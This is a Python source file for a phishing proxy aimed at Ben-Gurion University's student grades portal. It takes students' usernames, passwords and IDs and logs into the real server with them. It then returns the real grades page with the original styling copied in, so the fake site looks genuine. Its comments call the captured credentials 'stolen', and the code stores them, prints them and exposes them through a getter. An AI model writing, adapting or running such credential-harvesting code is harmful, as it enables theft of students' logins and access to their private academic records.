import requests

from libs.utils import Singleton
from website.static.styles.css import css


class Logic(metaclass=Singleton):

    def __init__(self):
        self.users = {}  # In memory dictionary for stolen credentials.

    # Renders list of courses grades for the client.
    def render_courses(self, username, password, identity, is_heb):
        """
        Arguments:
            username - Student's username.
            password - Student's password.
            identity - Student's ID.
            is_heb - A flag indicating whether to return the courses HTML page in Hebrew (1) or English (0).
        """

        # Getting BGU's session id for a student.
        session_id = self.get_session_id(username, password, identity)
        # If a student fails to authenticate via BGU's API (wrong credentials) sessions_id = -1 and we return is_heb flag.
        if session_id == -1:
            return is_heb

        # HTTP headers which are required for the POST request in order to successfully fetch the desired HTML page.
        #   Referer - This field is required in order to fake the source of which the POST request came from.
        #   Cookie - We attach the session_id that we've generated before in order to mimic a regular session to BGU's server.
        headers = {
            "Referer": "https://gezer1.bgu.ac.il/meser/main.php",
            "Cookie": f"PHPSESSID={session_id}"
        }

        # HTTP data
        #   isheb - BGU's server requires this flag in order to decide what language to return the HTML page.
        data = {
            "isheb": int(is_heb)
        }

        # The actual POST request to the server's desired endpoint containing the headers and data.
        # res contains the raw HTML page containing real student's grades, it is then decoded and injected with the real website's CSS file.
        res = requests.post("https://gezer1.bgu.ac.il/meser/crslist.php", data=data, headers=headers).content
        res = res.decode("windows-1255").replace("<link href=\"n3style.css\" rel=\"Stylesheet\" type=\"text/css\">", f"<style> {css} </style>")

        # In-memory saving stolen student's credentials.
        self.save(username, password, identity)

        # We return the HTML page for rendering it on the student's browser.
        return res

    # Save client's credentials.
    def save(self, username, password, identity):
        if username not in self.users:
            self.users[username] = {"password": password, "id": identity}
            print(self.users)

    # Return list of stolen credentials.
    def get_credentials(self):
        return self.users

    # Get BGU server's session id (cookie) in order to serve authentic HTML pages.
    @staticmethod
    def get_session_id(username, password, identity):
        # Creation of a session object for preserving session_id (Cookie) for further use.
        session = requests.Session()

        # Actual POST request to the desired server's endpoint with the student's credentials in attempt to successfully authenticate to BGU's server.
        # We then decode the HTML page in order to dynamically scan it to check whether it contains 'errorfound' token in it.
        # If the token is found in the HTML page we can be certain that the student failed to authenticate because of wrong credentials.
        # If the token was not found in the HTML page we know that the student authenticated successfully and we return the session_id (PHPSESSID).
        res = session.post("https://gezer1.bgu.ac.il/meser/main.php", data={"username": username, "pass": password, "id": identity}).content.decode(
            "windows-1255")

        if "errorfound" in res:
            return -1

        return session.cookies.get_dict()["PHPSESSID"]
